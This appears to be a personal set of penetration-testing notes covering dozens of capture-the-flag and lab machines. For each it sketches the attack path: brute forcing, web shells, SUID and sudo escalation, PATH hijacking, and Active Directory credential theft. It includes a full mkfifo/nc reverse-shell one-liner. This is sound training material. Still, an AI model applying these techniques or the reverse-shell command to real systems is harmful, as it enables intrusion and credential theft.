The roadmaps of pretty girls..

#### sar2html 13
suid, short bash shell

#### Natrj/18
file inclusion

#### sunset: dawn2/21

#### loly 25: 
wordpress, reverse shell; kernel exp

#### djinn3 29: 
SSTI get reverse shell, pspy to find cron job, use cron job to create credential to .ssh/authorized_keys, sudoers file for es

#### funbox2 30: 
ftp, ssh id_rsa; sudo -s

#### solid 35: 
25smtp, 110pop3; search suid file

#### sunset:
#### decoy:40: 
linux shadow decrypt, pspy

####seppuku 62: 
ftp,139,445 smb, enum4linux(smb scanner), hydra ssh, ssh -i private key, sudo -l, bash -c -i

####gaara 69: 
gobuster,2.3medium(if dirsearch found nothing), hydra ssh, suid (find / -type f -perm -u=s), pyhton os.execl

####sosimple 71: 
wpscan --enumlate , and -u bruteforce, plugin “social warfare.” rce to get shell, sudo -l, service sudoer.

####Y0usef 74: 
site-proxy bypass,upload file filter bypass, php shell, linux 3.13 exploit.

####doom: 
json unsearialize vuln of webapplication, rce; ps -aux to find process is running on root privi; sudo -l, tcpdump to escalate privi.


#### evil:one: 
  fuff-find parameter of web::cat the .ssh-id_rsa from web url::find p@asswd editable：：generate linux passwd file content::
#### dc-9
  sqli, LFI, port knock 22, sudo -l, add suer with root privi to passwd
#### pwned1
  dirsearch with medium dirc|| ssh -i || es: group, docker -v /:/media  chroot
#### tr0ll
  dirsearch with medium dirc, .pacp searching, hidden direc and again and ag, get id and passwd list, hydra ssh, ubuntu kernel vuln
#### photographer
  139/445 smb, php reverse shell, file upload(modify suffix to by pass front end format check), esclate privi suid  php7.2
#### born2root
  joomla, cewl to get psswd.txt to bruteforce the joomla login page:: hydra or burp s used, a powerful tool I need here:: joomla templates, modify with php reverse shell:: folder searching, for abnormal folder and files :: sudo -l:: nc -e

#### gitroot
  wordpress, git folder(GitTools- dumper,finder), suid git
#### born2root1
  privatekey not accept(PubkeyAcceptedKeyTypes=ssh-rsa), cat /crontab
#### raven 1
  wpscan --username to brute f the passwd, showmount for rpc, sudo -l- python to es
#### ha-waordy
  wpcan --username bruteforce to identify plusgins, use vuln to esclate scrf as aarti, get the useful infor of admin passwd, modify template page as reverse shell page, es: suid cp, create new user with 0:0 root, cp to overwrite passwd, su newuser.
#### raven-2
  phpmailer vuln remote code ex, if mysql is used, check wp-config for root passwd. fail to es
#### bottleneck
  dir big dirc,php reverseshell uploaded to get shell, sudo -l to su a nromal user shell, 
#### sunset1
  ftp, john the reeper to crack shadow passwd, sudo -l, ed
#### sunset-midnight
  3306 mysql hydra root/passwd; update passwd value in mysql; upload on line php reverseshell in wp, by adding upload plugins; check wp-content wp-config.php to get localhost passwd; fing -perm -u=s; export $PATH;
#### joy
  many ports open, 21 ftp, nmap -sU udp scan, tftp vuln, sudo -l , change the privi of passwd, openssl to gen new passwd line, add new user to passwd with /root/bin/bash shell;; telnet 21 port, site cpfr and cpto to move file into the host.(for sv of ptoftpd- http://www.proftpd.org/docs/contrib/mod_copy.html)
#### dc-4
  bruteforce on admin/ burp is slow, hydra not reliable; burp repeater to modify http request; tomcat setting file,; sudo -l add new user into /etc/passwd
#### fall
  dirsearch test.php,requires a get parameter; LFI, wfuzz to get the patameter; LFI the passwd and .ssh of bash user; ssh -i id_rsa; history, echo "x" | sudo -S xxx.
#### mercy
  139 share files; knock http and ssh; rcp vunl; tomcat server conf file dirc and user passwd leakage; tomcat .war file reverseshell by msfvenom; root privi of a file;
#### fristlink
  dirc info from page;f12 to view useful info; baes64  to image;php reverseshell with subfix .png; info searching, file rpivi; use rpvi to change privi of folder and files; sudo -l
#### hack_me_please
  view page source code to get hidden file and dirc; find seeddms application; google the setting page and accessible; get the ID and passwd of DB; get host user/passwd and seeddms ID/passwd; update the passwd of DB if cannot crack; vuln of seeddms; sudo -l
#### DerpNStink
  web dirc,wp plugin vuln- get shell; wp-config.php get mysql passwd;mysql get wp-admin login and host account passwd;sudo -l
#### deveguru
  .git didrc leakage, gittool to get the git file by git dumper to download and git extractor to restore to normal files; get the db credential; login web server backend; htm file RCE method, wget reverse shell to load it via web browser; searching for abnormal file - backups; get gitea db credential; gitea githook to launch hook shell(system bash shell); sudo -l sqlite3 but without passwd; sudo version , vuln; sudo -u#-1;
#### tommyboy
  wp user brute force; photo exiftool to veiw info; hidden port , not always open; fuff to find hidden file on web; crunch to generate word list;fcrackzip to crack zip passwd;wp apperance template fule php reverse shell; find dirc with writable privi;
#### RickSanchezEasy
  web ping page 127.0.0.1|id ; crunch to create wordlist; hydra ssh://xxxxx:port; sudo -l
#### tiki
  139 port, --shares; 80, tiki vuln auth bypass; get ssh crendential; sudo -l;
#### breach1
  use .keystore to decrypt wireshark file, types of keystore file; burpsuite tomcat management page, deploy war reverse shell; sudo -l
#### healthcare
  seclist-big wordlist to search dirc; vuln of openemr, or use sqlmap to inject db; php page reverse shell; u=s file, is executable, with a command, user PATH to trick teh command to run local PATH with '/bin/bash' in it get the ES
#### breach2
  ssh a port to enable http service; xss vuln, use beef to hijack the browser, and add reverse shell to get shell; good to stick the backdoor by modifying the .sh; conditions to enable more port, like 2323 and switch to anohter account to enbale 8888; upload reversesehll php; sudo -l tcpdump;
#### bob
  web remote code execute from web page, got a shell; gpg file decryption with passphrase; sudo -l
#### weakness
  add hosts mapping; openssl vuln, get private key; python pyc file deconplier; sudo -l
#### toppo
  web enumerate a passwd and guset the name; suid python,mawk
#### goldeneyes
  pop3 protocal, telnet to RETR emails; exifitool to view photo hidden info; web reverse shell for system path; kernal exploit, cc replace gcc, if gcc is not allowed;
#### nullbyte
  index pic exiftool for commit info- that might be passwd, directory, hash or encoded strings; one field input box hydra bruteforce; sqlmap; decoded words, try more methods, you will find the truth; u=s, $PATH to trick the script to run a file located in the current folder, it can be /bin/sh or /bin/bash. with s privi
#### pre-oscp
  id_rsa, ssh -i as oscp; u=s
#### lemonsqueezy
  wpscan id bruteforce; phpmyadmin wrtie command into outfile in query aommand to add a php?cmd= page for remote code execution; crontab to esclate privi
#### misdirection
  webshell- direct user; sudo -l to aother user on host; privi to write to /etc/passwd; openssl to generate crendential and add a user to /etc/passwd with 0:0:0 privi
#### brainpan
  .exe file, hte only path; bufferoverflow; sudo -l, manual (why ! before commands)
#### hackerkid
  source code hint;wfuzz ?parameter=FUZZ;dig domainname @IP(to get subdomain);SSTI to view .bashrc of passwd and id of 9999 port; SSTI of 9999 port lauch a reverse shell;ed- process injectrion
#### besidesVancouver
  wpscan brute force ID; themes edior with php re sehll;crontab for es
#### hackme1
  sqli get the auperadmin; php reversehll upload;a abnormal file to get id 0;
#### hackme2
  sqli like hackme1; c coded , input box, system("id"), indicates developed by C; system(base64_decode("payload") to bypass cannot type blank); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.129 8821 >/tmp/f (nc for revershell cannot user -e);
#### zico2
  phpLiteAdmin v1.9.3 default passwd admin; exploit  Remote PHP Code Injection to get a shell; enumerate zico home folder/wp-config get host passwd; sudo -l
#### kiopreix2
  web page ping app with python reverse shell toget a shell;kernel vuln
#### sickos
  proxy set to the target machine as it has a proxy running on a port; robots.txt, default id/passwd, upload shell php; config.php get a passwd, works for account of OS; sudo -l
#### vulnos1
  phpmyadmin default id/passwd root/toor;dvwa cmd get a shell;----
#### lin.secu
  nfs mount remote files on local sys; useradd name of remote with uid 1001; mkdir .ssh cp pubkey to authorized_keys; ssh -i
#### pwnlab
  vuln of PHP ?xx=payload to view the source code if web page; mysql -h remote; upload restriction by pass, extension and add GIF87a at the beggining; change $PATH if a executable file not use /bin/xx only xx;for echo script, use && to excute bash like xx && /bin/bash or /bin/sh
#### Mr-robothttp://10.10.77.158/wp-admin/theme-editor.php?file=index.php&theme=twentyfifteen&scrollto=408
  hydra to brute force username and then passwd!!!; comad to get uniq items in a text file; sudo -l nmap
#### skytower
  sqli if 'or' '=' is filtered, use || , > < instead; port 22 is filter by proxy, use proxytunnel to ssh; .bashrc details, if abnormal ,delete it; sudo -l with ../ in the dir 
hydra
#### alfred_rhm win
  genkins default passwd/user; porject with OS comand function, msfvenom create revershell and with command downlaod and run exe file; build it and run; get shell, es to meterpreter shell; list priv of current account, with debugger and impersonate privi; impersonte service token useing msf 'inicognato' module;

#### hackpark
  more about hydra, with additional body strings from Burps; app vuln to uplaod msf reverseshell ; msf handler; replace teh exe file to es

#### gamezone
  port80 sqli;ssh, ss find open session; ssh -L to forward the traffic to visit the port; app vuln use msf get root 

#### skynet
  smb anonymous; bruteforce http-post-form; smb with crndential;new web folder; cuppa exploit CVE- launch reverse shell; suspicious .sh file, wildcard injection;

#### Daily Bugle
  joomla scan, vuln; sqli vunl, use sqlmap or google for some script or method for a vuln; hashcat to bruteforce passwd; joomla template edit php file to get shell; web configure file, get sql root and passwd; this passwd also works for only user of host!!!!!sucks but remember;sudo -l

#### mrrobot-thm
  info enemulate of dir, wp page, find id and passwd of wp; thme index editor, php revershell; home/robot get password; suid nmap without sudo privi
#### relevant.thm
  smb put priv; put .aspx file into win server to get revershell shell; try http port to view smb dir; view smb file in th host; vuln to es

#### smol.thm
  wpscan -e ap to identify plugins; cve of this plugin LFI, view wp-config; wpscan not indentify other plugin,but from info in the site 'hello dolly';exploit hello dolly get a CMD parameter; get backdoor;lateral to oitehr user by viewing .ssh pri key; aga lateral, view /etc/pam.d/su; zip2john and john bruteforce zip with passwd; credntial of last one; sudo -l
#### Devie.thm
  source code of python, search for vuln function, eval; revershell, base64 and xor - utf8 encode;  cp * plus --preserve=mode to privi es

#### ad.thm
  139,445 3389,53 open; kerbutef to iditify user in this domain; impacket-GetNPUsers -no-pass , to get credential of this account; netexec and smbclient to get shared files -- another credential of backup account; backup can enum all ntlm hashed, using impacket-secretsdump ; use admin hash, evil-winrm to pas the pass to login the host with admin privi;

#### wonderland.thm
  dir enum get a passwd; sudo -l, create python lib under the current folder to be  misused by .py file, get a shell of the owner of .py; with suid file, use a 'date' function in side, create a malicious new one, with os.system('/bin/bash'), and exprot PATH, get a shell of another user; linpeas idenitfy capability, /usr/bin/perl5.26.1 = cap_setuid+ep

#### editor.htb
  xwiki vuln get a shell; xwiki config file, hibernate.cfg.xml, get a credential; cre reuse to ssh uer of host; ndsudo with suid to privies

#### puppy.htb
  rpc to identify users on this host; bloodhound search for privi of given account, and add user to DEV group can write DEV group; netexec with new privi to view share files, get kdbx file; keepass4brute to recover the data, get password list; users and psswds, use netexec smb to brute force paired id/passwd, get a new pair; blodhound search for thisnew user, not enabled- ldapsearch;  bloodyAD to reset passwd,ldapsearch to enable; evil-winrm login host and get user flag, backup file of anohter plain crendential; for the new user, we find masterkey and credential pair for DPAPI; use impacket-dpapi decrypt the paswd of the pair, which is a adm account, with all privi;

#### fluffy.htb
  smb vuln to get a new credntial hash; john getthe plain passwd, bllodhound to view privi- add to the group and get another 3 accounts shadow cert, whihc is ntlm hash, ensure vync time to the target dc; use vertipy-ad find vuln of DC. get ESC16 vuln, imperson the admin account to retreive the hash of admin; evil-winrm login as admin;

#### tombwatcher.htb
  with given account, account lateralmove; writeSPN privi, targetedKerberoast.py to get the hash of target you have privi;addself privi,ReadGMSPassword, gMSADumper.py to get hash of target account; forcechangepassword, change passwd of taget by useing bloodAD with -p hash;writeOwner privi, add owner to target, with own privi use impacket-dacledit grant fullcontrol privi, then reset target passwd, get user.txt; Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects, search deledted account;Restore-ADObject  and Enable-ADAccount, then rteset the passwd Set-ADAccountPassword; with this privi account, find vuln of AD, certipy-ad find ; esc15 to get root;

#### voleur.htb
  ntlm login is not allowed, so that cannot pass the hash. use impacket getTGT to get ccache of the given user, use ccache file to login smb server; get a xlsx file locked, use office2john and john crack it; get info of users and service account; workingwith bloodhound, use a svc-ldap id to get the ccache, and use targetedKerberoast.py to get the hash of passwd, and use john to get plain text of passwd; same way to deal wirth svc_winrm ,get TGT to get ccache file to login using evil-winrm; get user txt; from BH this accounbt has backup privi, use get-adobject to indeitify del users; get todd; use get-adobject to restore it and; getTGT to get ccache file and use impacket-smbclinet -k to use ccache to login smb; get some dpapi masterkey and credential , rerstore it using impacket-dpapi credential; also use getTGT to loogin with this id to smb; get ntds.dit and SYSTEM, to find all crendentials of AD;

#### Artificial.htb
  docker build from dockerfile; sqlite3 to select .db; restic to backup host file

#### bashed.htb
  dir search, get web bash page; find files or folders owned by a user, sudo -l ALL for this user;pspy64 to indentify crontab job; create py reverse shell into the folder, get root shell

#### beep.htb
  tls version not support by browsr, modify about:config of firefox to support tls1.0; cve of Elastix to IFI; get user txt and admin passwd; use as root of host to ssh; ssh DF algriths not support, modify .ssh/config: KexAlgorithms +diffie-hellman-group1-sha1 \n\r Ciphers +aes256-cbc, ssh -v -o HostKeyAlgorithms=+ssh-rsa root@10. //to support rsa

#### nineveh.htb
  enumerate http and https; hydra login page, -l none wihout username; app vuln to create a web shell; also app LFI, with specific key 'work' to incluion file; linpeas notice knock port 22, with id-rsa login as user; pspy64 notice routine job, with vuln, get root

#### valentine.htb
  heartbleed vuln to get base64 code -> a password; /dev page get a key, cat hype_key | xxd -r -p,openssl rsa -in /home/ed/id_rsa -out id_rsa.out to decode and decrypt key file used for ssh -i; ssh -i enable rsa ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -i key; tmux privi es, /.devs/dev_sess, linenum to check the active shell;

#### poison.htb
  LFI, get setc/passwd, and a passwd for charix, ssh to host;for freebsd socketstat and ps -aux identify a root process running vncserver on a local port; port forward this port; from a zip file, use vnc decryption to get vnc passwd, vnc RDP to root v desktop
#### node.htb
  check js file in develooper tool, for api website;controllers/admin.js indicates admin ot web page; get a backup.zip,john it; get a id/passwd for ssh; user.txt, mongosb, mongo -u xx -p xx tablename; insert a revershell; linpeas.sh find the routine taks of mongdb, get shell of new user; -u=s file, backup , strings, and ltrace it to view and guess the logical; $Home track to pas the filter; backup /root folder
